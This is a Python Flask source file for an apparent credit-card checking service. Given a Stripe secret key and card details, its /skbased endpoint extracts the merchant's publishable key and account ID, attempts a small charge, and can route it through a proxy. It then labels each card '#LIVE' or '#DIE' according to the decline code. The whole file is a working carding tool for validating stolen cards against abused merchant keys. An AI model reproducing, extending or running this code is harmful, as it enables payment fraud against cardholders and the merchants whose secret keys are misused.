from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

BASE_URL = "https://api.stripe.com/v1"

def retrieve_publishable_key_and_merchant(secret_key):
    price_url = f"{BASE_URL}/prices"
    headers = {"Authorization": f"Bearer {secret_key}"}
    price_data = {
        "currency": "usd",
        "unit_amount": 1000,
        "product_data[name]": "Gold Plan"
    }
    
    price_res = requests.post(price_url, headers=headers, data=price_data)
    
    if price_res.status_code != 200:
        price_error = price_res.json().get('error', {})
        error_code = price_error.get('code', '')
        error_message = price_error.get('message', '')

        if error_code == 'api_key_expired' or error_message.startswith('Invalid API Key provided'):
            return None, None  # Indicate expired or invalid key
        
        return None, None

    price_id = price_res.json()["id"]

    payment_link_url = f"{BASE_URL}/payment_links"
    payment_link_data = {
        "line_items[0][quantity]": 1,
        "line_items[0][price]": price_id
    }
    
    payment_link_res = requests.post(payment_link_url, headers=headers, data=payment_link_data)
    
    if payment_link_res.status_code != 200:
        return None, None

    payment_link = payment_link_res.json()["url"]
    payment_link_id = payment_link.split("/")[-1]

    merchant_ui_api_url = f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}"
    merchant_res = requests.get(merchant_ui_api_url)
    
    if merchant_res.status_code != 200:
        return None, None
    
    merchant_data = merchant_res.json()
    publishable_key = merchant_data.get("key")
    
    return publishable_key, merchant_data.get("stripe_account_id")

def create_payment_method_with_pk(card_number, exp_month, exp_year, cvc, pk):
    url = f"{BASE_URL}/payment_methods"
    
    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    payload = {
        "type": "card",
        "card[number]": card_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc,
        "billing_details[name]": "Harsh",
        "billing_details[email]": "typicallyalpha@gmail.com"
    }

    response = requests.post(url, data=payload, headers=headers)
    
    if response.status_code == 200:
        payment_method_id = response.json().get("id")
        return payment_method_id
    else:
        return response.json()  # Return the full error response

def create_charge(payment_method_id, sk, account_id, proxy=None):
    url = f"{BASE_URL}/payment_intents"
    
    headers = {
        "Authorization": f"Bearer {sk}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Stripe-Account": account_id  
    }
    
    payload = {
        "amount": 100,  # Amount in cents
        "currency": "usd",
        "payment_method": payment_method_id,
        "confirm": "true",
        "automatic_payment_methods[enabled]": "true",
        "automatic_payment_methods[allow_redirects]": "never"
    }

    # Use proxy if provided
    if proxy:
        response = requests.post(url, data=payload, headers=headers, proxies={"http": proxy, "https": proxy})
    else:
        response = requests.post(url, data=payload, headers=headers)

    return response.json()

@app.route('/skbased', methods=['GET'])
def sk_based_charge():
    sk = request.args.get('sk')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not sk or not cc:
        return jsonify({"error": "API key (sk) and card details (cc) are required"}), 400

    # Parse credit card details
    cc_details = cc.split('|')
    if len(cc_details) != 4:
        return jsonify({"error": "Card details must be in the format: cc|exp_month|exp_year|cvc"}), 400

    card_number, exp_month, exp_year, cvc = cc_details

    # Retrieve publishable key and account ID using the secret key
    publishable_key, account_id = retrieve_publishable_key_and_merchant(sk)

    if publishable_key is None:
        return jsonify({"message": "SK KEY IS EXPIRED."}), 403  # Forbidden error for expired key

    # Create payment method with publishable key
    payment_method_response = create_payment_method_with_pk(card_number, exp_month, exp_year, cvc, publishable_key)
    
    if isinstance(payment_method_response, dict) and 'error' in payment_method_response:
        return jsonify({
            "error": "Failed to create payment method",
            "details": payment_method_response
        }), 500  # Return the error details for debugging

    payment_method_id = payment_method_response

    # Create charge with the secret key
    charge_response = create_charge(payment_method_id, sk, account_id, proxy)

    # Check charge response for specific error codes
    error_code = charge_response.get('error', {}).get('code', 'none')
    decline_code = charge_response.get('last_payment_error', {}).get('code', 'none')

    # Construct message based on the decline code
    
    if error_code == 'cvc_check':
        message = f"#LIVE CC: {cc} | CVV Passed (Error Code: {error_code})"
    elif error_code == 'generic_decline':
        message = f"#DIE CC: {cc} | Generic Decline (Error Code: {error_code})"
    elif error_code == 'insufficient_funds':
        message = f"#LIVE CC: {cc} | Insufficient Funds (Error Code: {error_code})"
    elif error_code == 'fraudulent':
        message = f"#DIE CC: {cc} | Fraudulent Activity Detected (Error Code: {error_code})"
    elif error_code == 'do_not_honor':
        message = f"#DIE CC: {cc} | Do Not Honor (Error Code: {error_code})"
    elif error_code == 'incorrect_cvc':
        message = f"#LIVE CC: {cc} | Incorrect CVC (Error Code: {error_code})"
    elif error_code == 'expired_card':
        message = f"#DIE CC: {cc} | Expired Card (Error Code: {error_code})"
    else:
        message = f"Charge Status: {charge_response.get('status', 'unknown')} | Response: {charge_response} (Error Code: {error_code})"

    return jsonify({"message": message})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=True)
